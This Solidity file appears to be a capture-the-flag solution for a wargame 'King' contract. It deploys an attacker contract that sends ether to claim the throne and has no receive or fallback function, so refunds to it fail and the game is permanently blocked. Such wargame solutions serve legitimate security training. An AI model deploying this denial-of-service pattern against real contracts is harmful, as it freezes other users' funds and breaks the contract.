// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.19;

import "../../src/King/King.sol";
import "openzeppelin-contracts/contracts/access/Ownable.sol";
//import safe math
import "openzeppelin-contracts/contracts/utils/math/SafeMath.sol";

contract NothingIsHere is Ownable {
    using SafeMath for uint256;

    King public king;

    constructor(address _king) payable {
        king = King(payable(_king));
        // send 1 ether to the king contract to trigger receive() fn
        (bool milady,) = payable(address(king)).call{value: msg.value}("");
        require(milady, "King contract rejected payment");
    }
}
